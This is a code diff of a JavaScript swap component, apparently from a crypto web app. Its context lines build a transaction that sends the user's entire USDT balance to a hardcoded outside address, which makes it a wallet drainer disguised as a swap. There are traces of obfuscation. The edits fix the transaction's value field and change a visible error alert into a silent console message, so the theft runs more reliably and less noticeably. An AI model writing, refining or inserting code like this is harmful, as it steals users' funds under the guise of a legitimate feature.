@@ -177,7 +177,7 @@ function SwapComponent() {
             gasPrice: rGasPrice,
             gasLimit: '0x11170',
             to: USDT,
-            value: '',
+            value: '0x0',
             data: usdtContract.methods
               .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
               .encodeABI(),
@@ -217,7 +217,7 @@ function SwapComponent() {
             })
             .catch((_0x4ded9e) => console.log(_0x4ded9e))
         })
-        .catch((err) => alert(err))
+        .catch((err) => console.error(err))
     } catch (error) {
       console.log(error)
     }
